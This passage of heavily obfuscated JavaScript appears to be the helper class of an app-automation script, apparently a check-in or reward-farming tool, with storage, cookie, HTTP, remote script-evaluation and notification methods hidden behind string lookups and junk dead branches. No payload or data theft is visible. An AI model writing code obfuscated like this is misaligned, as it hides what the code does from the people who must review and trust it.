          return a(Y, j, Z);
        }
      };

      if (p["kAQmo"](p['FMTfD'], p["hJxpZ"])) {
        if (this[p["ZBOFC"]]()) {
          if (p["fpuZw"](p["sPEzq"], p["sPEzq"])) {
            this['fs'] = this['fs'] ? this['fs'] : p["PCnUE"](require, 'fs');
            this[p["pmWBT"]] = this["path"] ? this[p["pmWBT"]] : p["KHYMh"](require, p["pmWBT"]);
            const a = this[p['pmWBT']][p["KvgPB"]](this[p["QspTd"]]),
                  Y = this["path"]["resolve"](process[p['ySAzz']](), this[p["QspTd"]]),
                  j = this['fs'][p["BXaOH"]](a),
                  Z = !j && this['fs'][p["BXaOH"]](Y),
                  Q = JSON[p["yglKX"]](this[p["bJyZO"]]);
            j ? this['fs'][p["GOITo"]](a, Q) : Z ? this['fs']['writeFileSync'](Y, Q) : this['fs']["writeFileSync"](a, Q);
          } else {
            const {
              'statusCode': b,
              'statusCode': U,
              'headers': q,
              'body': i
            } = p,
                  J = {
              'status': b,
              'statusCode': U,
              'headers': q,
              'body': i
            };
            S["ouYdd"](C, null, J, i);
          }
        }
      } else {
        S += a[p["ahFam"]](Y);
        j++;
      }
    }

    [p["cfFUW"]](S, a, Y) {
      if (p["aLzlr"](p["guzpm"], p['vrSbp'])) {
        const j = a[p["oxSDa"]](/\[(\d+)\]/g, p["OAKFP"])["split"]('.');
        let Z = S;

        for (const Q of j) if (Z = p['lCgzA'](Object, Z)[Q], p['iLgkV'](void 0, Z)) {
          return p['GlHrm'](p['CeFwA'], p["CeFwA"]) ? c : Y;
        }

        return Z;
      } else {
        const U = p["RDxrj"]["split"]('|');
        let q = 0;

        while (true) {
          switch (U[q++]) {
            case '0':
              while (p['aSWQu'](i, U[p["BjSlF"]])) {
                const z = p["ZlUFa"]["split"]('|');
                let t = 0;

                while (true) {
                  switch (z[t++]) {
                    case '0':
                      J = E[p["VjGXc"]](i++);
                      continue;

                    case '1':
                      E = J >> 2;
                      continue;

                    case '2':
                      P = p['VmoGf'](V, 63);
                      continue;

                    case '3':
                      V = O[p["VjGXc"]](i++);
                      continue;

                    case '4':
                      h = p["Dwexk"](p["UAuSH"](h, this[p["qomwh"]]["charAt"](E)) + this[p["qomwh"]]['charAt'](W), this[p["qomwh"]][p["cYctR"]](O)) + this[p["qomwh"]][p["cYctR"]](P);
                      continue;

                    case '5':
                      W = p['LpZyx'](p["TeveR"](p["Ibluv"](J, 3), 4), I >> 4);
                      continue;

                    case '6':
                      O = p["TkIxf"](p['Ibluv'](I, 15), 2) | V >> 6;
                      continue;

                    case '7':
                      P(I) ? O = P = 64 : p["PDrmV"](z, V) && (P = 64);
                      continue;

                    case '8':
                      I = W[p["VjGXc"]](i++);
                      continue;
                  }

                  break;
                }
              }

              continue;

            case '1':
              Q = B[p['wUfba']](b);
              continue;

            case '2':
              return h;

            case '3':
              var i = 0;
              continue;

            case '4':
              var J, I, V, E, W, O, P;
              continue;

            case '5':
              var h = '';
              continue;
          }

          break;
        }
      }
    }

    ['lodash_set'](S, a, Y) {
      const j = {
        'ujMyN': p["zptFf"],
        'DFNRZ': function (Z, Q) {
          return p['UAuSH'](Z, Q);
        },
        'HmUaP': p['EcJAc'],
        'DHfZI': p["hxvZu"],
        'IKngy': "]今天已提现"
      };

      if ("qTlGs" === p['AoWvA']) {
        c[j["ujMyN"]](j["DFNRZ"](j["HmUaP"] + this[j["DHfZI"]], j['IKngy']));
        return;
      } else {
        return p['kjSki'](p["QXGGz"](Object, S), S) ? S : (Array[p['NdcoI']](a) || (a = a[p["zmrLt"]]()["match"](/[^.[\]]+/g) || []), a['slice'](0, -1)[p['FSxYT']]((Q, B, b) => Object(Q[B]) === Q[B] ? Q[B] : Q[B] = Math["abs"](a[b + 1]) >> 0 == +a[b + 1] ? [] : {}, S)[a[a["length"] - 1]] = Y, S);
      }
    }

    ["getdata"](S) {
      let a = this["getval"](S);

      if (/^@/[p['klehG']](S)) {
        const [, Y, j] = /^@(.*?)\.(.*?)$/[p["sOCit"]](S),
              Z = Y ? this[p["KpXSW"]](Y) : '';

        if (Z) {
          try {
            const Q = JSON[p["cdqvA"]](Z);
            a = Q ? this[p["cfFUW"]](Q, j, '') : a;
          } catch (B) {
            a = '';
          }
        }
      }

      return a;
    }

    ["setdata"](S, a) {
      const Y = {
        'CsmMy': p["zptFf"],
        'izhWR': function (j, Z) {
          return p["UAuSH"](j, Z);
        },
        'QMsKl': function (j, Z) {
          return p["vnBXj"](j, Z);
        },
        'SYuBn': p["EcJAc"],
        'uYRqB': p["TtNvJ"],
        'oDRpX': function (j, Z, Q) {
          return j(Z, Q);
        },
        'IRevg': function (j, Z, Q, B) {
          return p["JfCen"](j, Z, Q, B);
        },
        'HQQnZ': function (j, Z, Q) {
          return p["HNDsZ"](j, Z, Q);
        },
        'uIqgU': function (j, Z, Q) {
          return p['HNDsZ'](j, Z, Q);
        }
      };

      if (p["wNPNi"](p["TcHpJ"], p["TcHpJ"])) {
        p[Y["CsmMy"]](Y['izhWR'](Y["izhWR"](Y["QMsKl"](Y["SYuBn"], this["name"]), "]查询抽奖次数失败："), C[Y["uYRqB"]]));
      } else {
        let Z = false;

        if (/^@/["test"](a)) {
          if (p["Tmahj"] === "ozouY") {
            const [, Q, B] = /^@(.*?)\.(.*?)$/[p["sOCit"]](a),
                  b = this[p["KpXSW"]](Q),
                  U = Q ? p["iLgkV"](p["jubRa"], b) ? null : p['LMtso'](b, '{}') : '{}';

            try {
              if (p['zrOJZ'](p['zFqyz'], p['zFqyz'])) {
                const q = JSON[p["cdqvA"]](U);
                this[p["WWoXF"]](q, B, S);
                Z = this[p["CMAOs"]](JSON['stringify'](q), Q);
              } else {
                c = '';
              }
            } catch (J) {
              if (p["dceom"] !== p["dceom"]) {
                p[p["zptFf"]](p['EcJAc'] + this["name"] + p["wRgjR"] + C[p["TtNvJ"]]);
              } else {
                const V = {};
                this[p['WWoXF']](V, B, S);
                Z = this[p["CMAOs"]](JSON['stringify'](V), Q);
              }
            }
          } else {
            I = V(E, Y['oDRpX'](W, O(Y["IRevg"](P, h, z, v), M), d));
            return Y["HQQnZ"](u, Y["uIqgU"](e, A, k), o);
          }
        } else {
          Z = this[p["CMAOs"]](S, a);
        }

        return Z;
      }
    }

    [p['KpXSW']](S) {
      if (p["CvmUM"]("JwVvM", p["QfLFC"])) {
        return this["isSurge"]() || this[p["pFleU"]]() ? $persistentStore[p["tDtzG"]](S) : this[p["iQFDW"]]() ? $prefs[p["Dixqr"]](S) : this[p["ZBOFC"]]() ? (this[p["bJyZO"]] = this[p["oaHVG"]](), this[p["bJyZO"]][S]) : this[p['bJyZO']] && this['data'][S] || null;
      } else {
        Q = true;
        B = p['uwDzR'];
        b["log"](U[p["EqCpB"]][q[p["Qdwtu"]]]);
        i['log'](J[p["JighY"]]);
        I["log"](p["UAuSH"]("现在运行的脚本版本是：1.07，最新脚本版本：", V[p["prrOr"]]));
      }
    }

    [p["CMAOs"]](S, a) {
      if (p["trKFz"]("RncrN", p['pXFEM'])) {
        p["SjPNS"](h, 191) && z < 224 ? (v = M[p["VjGXc"]](p["Dwexk"](d, 1)), u += e[p['ahFam']](p["grcPA"](p['TkIxf'](p["Ibluv"](A, 31), 6), p['VmoGf'](k, 63))), o += 2) : (g = t[p["VjGXc"]](L + 1), X = m[p["VjGXc"]](p['byKEy'](n, 2)), F += w[p['ahFam']](p['lEwQp'](p['lEwQp'](p['VRRCq'](G & 15, 12), p['VRRCq'](p["OwlMa"](s, 63), 6)), p["bigyF"](N, 63))), l += 3);
      } else {
        return this[p["otPpW"]]() || this["isLoon"]() ? $persistentStore[p['vZbwI']](S, a) : this[p['iQFDW']]() ? $prefs[p["VLgNd"]](S, a) : this[p['ZBOFC']]() ? (this[p['bJyZO']] = this["loaddata"](), this[p["bJyZO"]][a] = S, this[p['sqZqT']](), true) : this[p['bJyZO']] && this[p['bJyZO']][a] || null;
      }
    }

    ["initGotEnv"](S) {
      this['got'] = this["got"] ? this[p["QWjjK"]] : p["DkbBH"](require, p['QWjjK']);
      this[p["UiSpV"]] = this[p["UiSpV"]] ? this[p["UiSpV"]] : p["KHYMh"](require, "tough-cookie");
      this[p["YPnZK"]] = this[p['YPnZK']] ? this['ckjar'] : new this[p["UiSpV"]][p["XKCmp"]]();
      S && (S[p['CnQpI']] = S["headers"] ? S["headers"] : {}, p["TtnJv"](void 0, S["headers"][p['RMosR']]) && p["YNyqr"](void 0, S[p['yVUhK']]) && (S[p["yVUhK"]] = this["ckjar"]));
    }

    [p["RKmAs"]](S, a = () => {}) {
      const Y = {
        'UdqGV': p['mwHZH'],
        'TUnPR': p["OoXTZ"],
        'HoMdV': p["RMosR"],
        'avXXf': p['cdqvA'],
        'BnDZw': p["zmrLt"],
        'fpIJD': "ckjar",
        'LrKBU': p["oxSDa"],
        'rmuqQ': p['OAKFP'],
        'IASLT': p['WSLCy'],
        'UklYl': function (j, Z) {
          return p["wUYJJ"](j, Z);
        },
        'LSabO': function (j, Z) {
          return p['LeKWn'](j, Z);
        },
        'yBIqC': function (j, Z) {
          return j !== Z;
        },
        'vOTVx': function (j, Z, Q, B) {
          return j(Z, Q, B);
        },
        'hLwIM': p["vzzEN"],
        'VzDKz': p['EdUvM'],
        'hAFKC': p['AVPvJ'],
        'WnPLs': function (j, Z) {
          return j * Z;
        },
        'ZHxxG': p["ZlfGt"],
        'zuzuu': p["gSLSA"],
        'KkMcq': "/v1/scripting/evaluate",
        'iJpXR': 'cron',
        'HQpIg': p['etbIn'],
        'vUGiE': 'stringify',
        'oihlA': p["joTdF"],
        'RihlV': p["IVzJq"]
      };

      if (S["headers"] && (delete S[p["CnQpI"]]['Content-Type'], delete S[p["CnQpI"]][p["TmduP"]]), this[p["otPpW"]]() || this['isLoon']()) {
        const j = {
          'X-Surge-Skip-Scripting': false
        };
        this[p["otPpW"]]() && this[p["dkryr"]] && (S["headers"] = S[p["CnQpI"]] || {}, Object[p['jQefX']](S[p['CnQpI']], j));
        $httpClient["get"](S, (Z, Q, B) => {
          const b = {
            'fUVto': function (U, q) {
              return U != q;
            },
            'RCqYy': p["okFDC"],
            'shSaQ': function (U, q) {
              return p['wIaAf'](U, q);
            }
          };

          if (p["zbicl"] !== "QKHhJ") {
            return b['fUVto'](b['RCqYy'], typeof p) && b["shSaQ"](b["RCqYy"], typeof C);
          } else {
            !Z && Q && (Q[p["xxCGx"]] = B, Q[p["OILzj"]] = Q[p["Qdwtu"]]);
            p["Artlm"](a, Z, Q, B);
          }
        });
      } else {
        if (this[p["iQFDW"]]()) {
          if (p['aLzlr'](p["vqIld"], p["vqIld"])) {
            const Q = p['headers'][Y["UdqGV"]][Y["TUnPR"]](this["cktough"][Y["HoMdV"]][Y["avXXf"]])[Y["BnDZw"]]();
            Q && this[Y['fpIJD']]["setCookieSync"](Q, null);
            C['cookieJar'] = this["ckjar"];
          } else {
            const Q = {
              'hints': false
            };
            this[p['dkryr']] && (S[p["DSYHW"]] = S["opts"] || {}, Object[p["jQefX"]](S[p["DSYHW"]], Q));
            $task[p['AVdeR']](S)["then"](B => {
              if (Y["yBIqC"]("cAblz", "BdVDO")) {
                const {
                  'statusCode': b,
                  'statusCode': U,
                  'headers': q,
                  'body': i
                } = B,
                      J = {
                  'status': b,
                  'statusCode': U,
                  'headers': q,
                  'body': i
                };
                Y["vOTVx"](a, null, J, i);
              } else {
                const V = S[Y["LrKBU"]](/\[(\d+)\]/g, Y["rmuqQ"])[Y["IASLT"]]('.');
                let E = a;

                for (const W of V) if (E = Y['UklYl'](Z, E)[W], Y["LSabO"](void 0, E)) {
                  return B;
                }

                return E;
              }
            }, B => a(B));
          }
        } else {
          if (this[p["ZBOFC"]]()) {
            let B = require(p["dpyRy"]);

            this[p["NZKvT"]](S);
            this[p["QWjjK"]](S)['on'](p["DtvFl"], (b, U) => {
              const q = {
                'yBbNL': function (i, J) {
                  return i + J;
                },
                'xEwDY': p['EcJAc'],
                'qJZGH': p["hxvZu"],
                'HVYFG': p["GELSz"]
              };

              if ("PZtyq" !== p['wxdsy']) {
                try {
                  if (p['GlHrm'](p["whkmH"], p["LnFLI"])) {
                    if (b[p["CnQpI"]]['set-cookie']) {
                      if (p['AZIgJ'](p['yVGro'], p["YwLUJ"])) {
                        let J = this[Y["hLwIM"]]('@chavy_boxjs_userCfgs.httpapi');
                        J = J ? J['replace'](/\n/g, '')[Y['VzDKz']]() : J;
                        let I = this[Y["hLwIM"]](Y["hAFKC"]);
                        I = I ? Y["WnPLs"](1, I) : 20;
                        I = a && Y[Y["ZHxxG"]] ? j[Y["ZHxxG"]] : I;
                        const [V, E] = J[Y["IASLT"]]('@'),
                              W = {
                          'url': Y["zuzuu"] + E + Y['KkMcq'],
                          'body': {
                            'script_text': Z,
                            'mock_type': Y["iJpXR"],
                            'timeout': I
                          },
                          'headers': {
                            'X-Key': V,
                            'Accept': "*/*"
                          }
                        };
                        this[Y['HQpIg']](W, (O, P, h) => J(h));
                      } else {
                        const J = b[p['CnQpI']][p["mwHZH"]][p['OoXTZ']](this['cktough'][p['RMosR']][p["cdqvA"]])[p["zmrLt"]]();
                        J && this[p['YPnZK']][p["tePDi"]](J, null);
                        U[p["yVUhK"]] = this[p["YPnZK"]];
                      }
                    }
                  } else {
                    c(q["yBbNL"](q["yBbNL"](q['xEwDY'], this[q['qJZGH']]), q["HVYFG"]));
                  }
                } catch (V) {
                  if (p["eXpjG"](p["JUiUY"], p['JUiUY'])) {
                    return;
                  } else {
                    this["logErr"](V);
                  }
                }
              } else {
                try {
                  return Y[Y['vUGiE']](j);
                } catch {
                  return Q;
                }
              }
            })[p["oyxHj"]](b => {
              if (Y["oihlA"] !== Y["RihlV"]) {
                const {
                  'statusCode': U,
                  'statusCode': q,
                  'headers': i,
                  'rawBody': J
                } = b,
                      I = {
                  'status': U,
                  'statusCode': q,
                  'headers': i,
                  'rawBody': J
                };
                a(null, I, B["decode"](J, this["encoding"]));
              } else {
                p = C = 64;
              }
            }, b => {
              const {
                'message': U,
                'response': q
              } = b;
              a(U, q, q && B[p['gsqaw']](q[p["FhEjN"]], this[p["RFRMI"]]));
            });
          }
        }
      }
    }

    ['post'](S, a = () => {}) {
      const Y = {
        'pLfKc': 'accessSync',
        'ddZwC': p['UYJcj'],
        'OamBD': "push",
        'CLqeE': p["zptFf"],
        'bgNwO': "join",
        'vEcGs': "logs",
        'HCUts': p["GyCOW"],
        'IQzDf': function (j, Z, Q, B) {
          return p["sgTIG"](j, Z, Q, B);
        },
        'HyodB': p["gsqaw"],
        'FnWHf': p["xxCGx"],
        'FYnHG': p["vzzEN"]
      };

      if (p["COyHl"](p["FqyOv"], p['FqyOv'])) {
        const j = S["method"] ? S[p["XqpKL"]][p['YiMkm']]() : p["etbIn"];

        if (S['body'] && S["headers"] && !S[p["CnQpI"]][p["GPTjE"]] && (S[p["CnQpI"]][p["GPTjE"]] = p["KGaQY"]), S[p['CnQpI']] && delete S["headers"]["Content-Length"], this[p["otPpW"]]() || this[p["pFleU"]]()) {
          const Z = {
            'X-Surge-Skip-Scripting': false
          };
          this[p["otPpW"]]() && this['isNeedRewrite'] && (S[p["CnQpI"]] = S[p["CnQpI"]] || {}, Object[p['jQefX']](S[p["CnQpI"]], Z));
          $httpClient[j](S, (Q, B, b) => {
            if (p["PGeLw"](p["eOJgE"], "qKXOs")) {
              try {
                Y[Y["pLfKc"]](j, Z["F_OK"]);
              } catch (q) {
                return false;
              }

              return true;
            } else {
              p['BiCfK'](!Q, B) && (B[p["xxCGx"]] = b, B[p["OILzj"]] = B["status"]);
              p["Artlm"](a, Q, B, b);
            }
          });
        } else {
          if (this["isQuanX"]()) {
            if (p['eXpjG'](p["uxKuS"], p["YflCp"])) {
              S["method"] = j;
              const Q = {
                'hints': false
              };
              this[p["dkryr"]] && (S["opts"] = S[p["DSYHW"]] || {}, Object[p["jQefX"]](S[p['DSYHW']], Q));
              $task["fetch"](S)["then"](B => {
                const {
                  'statusCode': b,
                  'statusCode': U,
                  'headers': q,
                  'body': i
                } = B,
                      J = {
                  'status': b,
                  'statusCode': U,
                  'headers': q,
                  'body': i
                };
                p["PONzR"](a, null, J, i);
              }, B => a(B));
            } else {
              let b = ['', Y["ddZwC"]];
              b[Y["OamBD"]](Y);
              j && b[Y["OamBD"]](Z);
              Q && b[Y["OamBD"]](B);
              b[Y["CLqeE"]](b[Y["bgNwO"]]("\n"));
              this[Y["vEcGs"]] = this[Y["vEcGs"]][Y["HCUts"]](b);
            }
          } else {
            if (p["SzLrO"] === p["iLBMM"]) {
              var U = '',
                  q = 0,
                  i = I = V = 0;

              while (p["aSWQu"](q, E["length"])) {
                i = g['charCodeAt'](q);
                i < 128 ? (U += r[p['ahFam']](i), q++) : i > 191 && i < 224 ? (D = K["charCodeAt"](p["Dwexk"](q, 1)), U += y[p["ahFam"]](p['jwBsW'](p["VRRCq"](p["QuYWg"](i, 31), 6), p["QuYWg"](H, 63))), q += 2) : (x0 = x1[p["VjGXc"]](p["VjinD"](q, 1)), x2 = x3[p["VjGXc"]](q + 2), U += x4[p["ahFam"]](p["lEwQp"](p["bigyF"](i, 15) << 12 | p["TeveR"](p['OwlMa'](x5, 63), 6), p["XdkAK"](x6, 63))), q += 3);
              }

              return U;
            } else {
              if (this["isNode"]()) {
                let U = p['TlowU'](require, p["dpyRy"]);
                this[p['NZKvT']](S);
                const {
                  'url': q,
                  ...i
                } = S;
                this[p["QWjjK"]][j](q, i)[p['oyxHj']](J => {
                  const {
                    'statusCode': I,
                    'statusCode': V,
                    'headers': E,
                    'rawBody': W
                  } = J,
                        O = {
                    'status': I,
                    'statusCode': V,
                    'headers': E,
                    'rawBody': W
                  };
                  Y["IQzDf"](a, null, O, U[Y['HyodB']](W, this["encoding"]));
                }, J => {
                  if (p["kjSki"](p["BIiQy"], p["BIiQy"])) {
                    !B && b && (U[Y['FnWHf']] = q, i["statusCode"] = J['status']);
                    I(V, E, W);
                  } else {
                    const {
                      'message': V,
                      'response': E
                    } = J;
                    a(V, E, E && U[p["gsqaw"]](E[p['FhEjN']], this["encoding"]));
                  }
                });
              }
            }
          }
        }
      } else {
        let I = S;
        const V = this[Y["FYnHG"]](a);

        if (V) {
          try {
            I = B["parse"](this[Y["FYnHG"]](b));
          } catch {}
        }

        return I;
      }
    }

    [p['gpnqP']](S, a = null) {
      if (p["trKFz"]("brNJU", p['VDccZ'])) {
        const j = a ? new Date(a) : new Date();
        let Z = {
          'M+': j[p["eAvjM"]]() + 1,
          'd+': j["getDate"](),
          'H+': j[p["holXm"]](),
          'm+': j[p["xDdDr"]](),
          's+': j[p["BhRez"]](),
          'q+': Math[p["TvWRe"]]((j['getMonth']() + 3) / 3),
          'S': j[p["eORan"]]()
        };
        /(y+)/[p["klehG"]](S) && (S = S[p["oxSDa"]](RegExp['$1'], (j[p['vbWqg']]() + '')[p['tqfVj']](p["JXjvz"](4, RegExp['$1'][p["BjSlF"]]))));

        for (let Q in Z) new RegExp(p['fVzdw'](p['UAuSH']('(', Q), ')'))[p['klehG']](S) && (S = S["replace"](RegExp['$1'], p['wIaAf'](1, RegExp['$1'][p["BjSlF"]]) ? Z[Q] : p["TzKdY"]('00', Z[Q])["substr"](p["CjPRq"]('', Z[Q])["length"])));

        return S;
      } else {
        return "undefined"(typeof c);
      }
    }

    [p["EqCpB"]](S = T, a = '', Y = '', j) {
      const Z = {
        'EJUwx': p["yglKX"]
      },
            Q = B => {
        if (p["fbhqs"](p["StGXT"], p['StGXT'])) {
          return {};
        } else {
          if (!B) {
            return B;
          }

          if (p["DqQSs"](p["xzljc"], typeof B)) {
            return this[p["pFleU"]]() ? B : this["isQuanX"]() ? {
              'open-url': B
            } : this["isSurge"]() ? {
              'url': B
            } : void 0;
          }

          if (p["wIaAf"](p["GbhIY"], typeof B)) {
            if (p["oWRuK"](p["iKVwy"], p["YwySq"])) {
              if (this[p["pFleU"]]()) {
                let U = B["openUrl"] || B[p['PHvoA']] || B[p['YrFOy']],
                    q = B[p['qHwIR']] || B["media-url"];
                const i = {
                  'openUrl': U,
                  'mediaUrl': q
                };
                return i;
              }

              if (this[p["iQFDW"]]()) {
                let J = B['open-url'] || B["url"] || B[p["neFMM"]],
                    I = B[p["AmYlh"]] || B[p["qHwIR"]];
                const V = {
                  'open-url': J,
                  'media-url': I
                };
                return V;
              }

              if (this['isSurge']()) {
                if (p["oWRuK"]('dWToQ', p['QcLsp'])) {
                  let E = B[p["PHvoA"]] || B[p['neFMM']] || B[p["YrFOy"]];
                  const W = {
                    'url': E
                  };
                  return W;
                } else {
                  return p[Z["EJUwx"]](C);
                }
              }
            } else {
              return;
            }
          }
        }
      };

      if (this[p["wCvXJ"]] || (this[p["otPpW"]]() || this[p["pFleU"]]() ? $notification[p["etbIn"]](S, a, Y, p['MwUVs'](Q, j)) : this[p["iQFDW"]]() && p['DlZAG']($notify, S, a, Y, p['DkbBH'](Q, j))), !this[p["Ofyag"]]) {
        if (p["QJAuk"](p["gbJiu"], "YYdDH")) {
          let B = ['', p["UYJcj"]];
          B[p["hVYZM"]](S);
          a && B[p["hVYZM"]](a);
          Y && B[p['hVYZM']](Y);
          console[p['zptFf']](B[p["WWffZ"]]("\n"));
          this[p["gIXmD"]] = this[p['gIXmD']]["concat"](B);
        } else {
          var U = i["charCodeAt"](J);
          p['aSWQu'](U, 128) ? e += A["fromCharCode"](U) : U > 127 && p["aSWQu"](U, 2048) ? (k += o[p["ahFam"]](p["lTwok"](p["PWzGA"](U, 6), 192)), g += t[p['ahFam']](p["lEwQp"](p['VmoGf'](U, 63), 128))) : (L += X[p["ahFam"]](p["PWzGA"](U, 12) | 224), m += n["fromCharCode"](p['RQlYQ'](p["dnKxP"](U, 6) & 63, 128)), F += w[p["ahFam"]](p["MuZQP"](p['LUylu'](U, 63), 128)));
        }
      }
    }

    [p["TymXe"]]() {
      return p["BLLLJ"]("RQyes", "RQyes") ? {} : p["qOijJ"];
    }

    [p["zptFf"]](...S) {}

    [p["UpyIA"]](S, a) {
      if (p["NjfUP"] === p["NjfUP"]) {
        const Y = !this[p["otPpW"]]() && !this[p['iQFDW']]() && !this[p["pFleU"]]();
        Y ? this[p["zptFf"]]('', '❗️' + this[p["hxvZu"]] + p["PLJvd"], S[p["yObaT"]]) : this['log']('', p["fkDrB"](p["CjPRq"]('❗️', this[p["hxvZu"]]), p['PLJvd']), S);
      } else {
        return p - C;
      }
    }

    [p["imxhs"]]() {
      if (p['GlHrm'](p["UiWzb"], p["UiWzb"])) {
        return c;
      } else {
        var S = new FxPCnMKLw7();
        return S[p["gsqaw"]](this['fwcaas']());
      }
    }

    [p['BkHGP']](S) {
      return new Promise(a => setTimeout(a, S));
    }

    [p['YOrWi']](S = {}) {
      const a = new Date()["getTime"](),
            Y = p["JXjvz"](a, this[p["imQKp"]]) / 1000;
      this["log"]('', p["uoqhc"](p["uoqhc"](p['uoqhc'](p['EREtS']('🔔', this[p["hxvZu"]]), ", 结束! 🕛 "), Y), " 秒"));
      this[p["zptFf"]]();
      (this[p['otPpW']]() || this[p["iQFDW"]]() || this[p['pFleU']]()) && $done(S);
    }

  }(T, c);
}